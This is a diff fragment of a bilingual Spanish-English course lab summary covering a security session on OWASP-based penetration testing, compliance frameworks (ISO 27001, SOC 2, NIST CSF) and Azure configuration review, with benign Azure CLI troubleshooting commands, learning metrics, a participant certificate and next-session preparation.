+- **Vulnerability Assessment:** 16 vulnerabilidades identificadas usando OWASP Top 10
+- **Exploitation:** SQL Injection, XSS, Auth Bypass demostrados
+- **Documentation:** Reportes siguiendo estándares OWASP
+
+### **✅ Objective 2: Implementar Simulación de Ataques**
+- **SQL Injection:** Union-based y time-based blind attacks ejecutados
+- **XSS:** Reflected y stored XSS demostrados  
+- **Authentication Bypass:** Token prediction y user enumeration
+- **Command Injection:** OS command execution demostrado
+
+### **✅ Objective 3: Aplicar Frameworks de Compliance**
+- **ISO 27001:** Assessment completo con gap analysis
+- **SOC 2:** Evaluación de criterios de seguridad y controles
+- **NIST CSF:** Mapeo de controles IDENTIFY, PROTECT, DETECT, RESPOND, RECOVER
+- **Scoring:** Algoritmos de compliance implementados
+
+### **✅ Objective 4: Evaluar Configuración Azure End-to-End**
+- **IAM Assessment:** RBAC, MFA, privileged access evaluado
+- **Network Security:** NSG rules, DDoS protection, segmentation
+- **Data Protection:** Encryption, access controls, backup policies
+- **Monitoring:** Logging, alerting, incident response capabilities
+
+### **✅ Objective 5: Documentar Hallazgos Profesionalmente**
+- **Technical Reports:** Detailed findings con CVSS scoring
+- **Executive Briefings:** Business impact y financial risk quantified
+- **Compliance Reports:** Framework-specific gap analysis
+- **Metrics Dashboards:** KPIs y trend analysis
+
+---
+
+## 🎓 COMPETENCIAS PROFESIONALES DESARROLLADAS
+
+### **🔒 Penetration Testing Skills:**
+1. **Metodología Sistemática:** OWASP Testing Guide v4.2 aplicado
+2. **Tool Proficiency:** Nmap, curl, custom .NET testing tools
+3. **Vulnerability Exploitation:** Hands-on experience con vulnerabilidades reales
+4. **Risk Assessment:** CVSS scoring y business impact analysis
+
+### **📋 Compliance Assessment Skills:**
+1. **Framework Knowledge:** ISO 27001, SOC 2, NIST CSF dominados
+2. **Gap Analysis:** Systematic control evaluation y remediation planning
+3. **Risk Quantification:** Financial impact assessment y regulatory exposure
+4. **Automated Assessment:** .NET tools para compliance monitoring
+
+### **📊 Professional Communication Skills:**
+1. **Technical Documentation:** Detailed findings con proof-of-concept
+2. **Executive Reporting:** Business-focused risk communication
+3. **Compliance Reporting:** Regulatory-ready documentation
+4. **Metrics Visualization:** KPI dashboards y trend analysis
+
+---
+
+## 💼 VALOR PROFESIONAL GENERADO
+
+### **Para el Participante:**
+- **Portfolio Evidence:** Reportes profesionales para demostrar competencias
+- **Tool Proficiency:** .NET Core 9 security assessment tools desarrollados
+- **Framework Expertise:** Conocimiento práctico de standards internacionales
+- **Professional Credibility:** Documentación de nivel enterprise
+
+### **Para la Organización:**
+- **Risk Visibility:** Clear understanding del posture de seguridad actual
+- **Compliance Readiness:** Gap analysis para certificaciones importantes
+- **Cost Avoidance:** Identificación proactiva de vulnerabilidades críticas
+- **Investment Guidance:** Priorización basada en risk/business impact
+
+### **Valor Económico Estimado:**
+- **Vulnerability Assessment:** $15,000 - $30,000 (consulting rate equivalent)
+- **Compliance Assessment:** $25,000 - $50,000 (professional audit equivalent)  
+- **Risk Quantification:** $10,000 - $20,000 (risk assessment services)
+- **Documentation Package:** $5,000 - $15,000 (technical writing services)
+
+**Total Professional Value Generated:** $55,000 - $115,000
+
+---
+
+## 🚀 PREPARACIÓN PARA PRÓXIMA SESIÓN
+
+### **Sesión 10 (Lunes 28/07) - Casos Prácticos Parte 1:**
+
+**📚 Conocimientos Base Establecidos:**
+✅ Penetration testing methodology
+✅ Vulnerability assessment techniques  
+✅ Compliance framework application
+✅ Professional documentation standards
+
+**🎯 Aplicación en Proyecto Final:**
+- Todos los hallazgos de esta sesión se integrarán en el proyecto final
+- Las vulnerabilidades identificadas serán remediadas usando secure coding practices
+- Los gaps de compliance serán address through architectural decisions
+- La documentación servirá como baseline para improvement tracking
+
+**🛠️ Herramientas Preparadas:**
+- .NET Core 9 development environment optimizado
+- Azure CLI configurado con permisos apropiados
+- Security assessment tools desarrollados y probados
+- Reporting templates establecidos
+
+---
+
+## 🔧 TROUBLESHOOTING Y SOPORTE
+
+### **Problemas Comunes Resueltos:**
+
+**Error: "Insufficient permissions for Security Center"**
+```powershell
+# Solución aplicada
+az role assignment list --assignee [email] --output table
+# Usuario verificado en grupo "gu_desarrollo_seguro_aplicacion"
+Error: "Application won't start on localhost"
+# Solución aplicada
+netstat -ano | findstr :5000
+# Puerto verificado como disponible
+dotnet run --urls="http://localhost:5000"
+Error: "Azure CLI authentication failed"
+# Solución aplicada
+az login --use-device-code
+az account set --subscription [subscription-id]
+Recursos de Soporte Disponibles:
+•	Documentación Técnica: Todos los artifacts generados
+•	Code Repository: Proyectos .NET completamente funcionales
+•	Knowledge Base: Troubleshooting guide documentado
+•	Professional Network: Contacts para continuous learning
+________________________________________
+📈 MÉTRICAS DE ÉXITO DEL LABORATORIO
+Completion Metrics:
+•	✅ 100% de objetivos alcanzados
+•	✅ 75 minutos tiempo objetivo cumplido
+•	✅ 16 vulnerabilidades identificadas y documentadas
+•	✅ 3 frameworks de compliance aplicados
+•	✅ 8 reportes profesionales generados
+Quality Metrics:
+•	✅ CVSS scoring aplicado consistentemente
+•	✅ Business impact quantified para todas las findings
+•	✅ Remediation guidance provided para todas las vulnerabilities
+•	✅ Executive communication optimized para decision makers
+Learning Metrics:
+•	✅ Hands-on experience con real-world vulnerabilities
+•	✅ Tool proficiency desarrollado en .NET Core 9
+•	✅ Framework expertise gained en international standards
+•	✅ Professional documentation skills demonstrated
+________________________________________
+🎉 RECONOCIMIENTO Y CERTIFICACIÓN
+🏆 LOGROS DESTACADOS:
+🥇 Technical Excellence:
+•	Implementación flawless de metodologías OWASP
+•	Advanced .NET Core 9 security assessment tools
+•	Comprehensive vulnerability exploitation demonstrated
+🥇 Professional Communication:
+•	Executive-ready risk communication
+•	Compliance-grade documentation produced
+•	Business impact quantification mastered
+🥇 Framework Mastery:
+•	ISO 27001 controls assessment completed
+•	SOC 2 criteria evaluation executed
+•	NIST CSF implementation demonstrated
+📜 CERTIFICACIÓN DE COMPETENCIAS:
+Este laboratorio certifica que el participante ha demostrado competencia profesional en:
+1.	✅ Penetration Testing Methodology - Advanced Level
+2.	✅ Compliance Framework Assessment - Professional Level
+3.	✅ Security Risk Communication - Executive Level
+4.	✅ Technical Documentation - Enterprise Level
+5.	✅ Tool Development - Expert Level (.NET Core 9)
+Certificado por: Jhonny Ramirez Chiroque
+Fecha: 25 de Julio de 2025
+Nivel: Advanced Security Assessment Professional
+________________________________________
+🎯 CALL TO ACTION - PRÓXIMOS PASOS
+Immediate Actions (Next 24 hours):
+1.	📋 Review todos los reportes generados
+2.	🔍 Identify cuáles vulnerabilities son más relevantes para tu contexto
+3.	📚 Study los remediation recommendations detalladamente
+4.	💼 Prepare questions para la próxima sesión
+This Week:
+1.	🛠️ Practice implementing las fixes recomendadas
+2.	📊 Experiment con los tools desarrollados en otros contexts
+3.	🤝 Share insights con colegas y peers
+4.	📖 Research additional resources sobre temas de interés
+Next Session Preparation:
+1.	🎯 Bring specific scenarios de tu trabajo actual
+2.	🤔 Think about cómo aplicar estos concepts en real projects
+3.	💡 Prepare ideas para el proyecto final integration
+4.	🚀 Get ready para hands-on implementation session
+________________________________________
+🎊 ¡FELICITACIONES!
+Has completado exitosamente uno de los laboratorios más comprehensivos del curso.
+Ahora posees:
+•	✨ Skills de nivel professional en penetration testing
+•	🎯 Expertise en compliance frameworks internacionales
+•	📊 Capacidades de communication ejecutiva de riesgos
+•	🛠️ Tools desarrollados que puedes usar en trabajo real
+¡Nos vemos el lunes 28/07 para aplicar todo esto en casos prácticos reales! 🚀
+________________________________________
+🔗 Recursos Adicionales:
+•	OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
+•	ISO 27001 Controls: https://www.iso.org/isoiec-27001-information-security.html
+•	NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
+•	Azure Security Best Practices: https://docs.microsoft.com/en-us/azure/security/
+
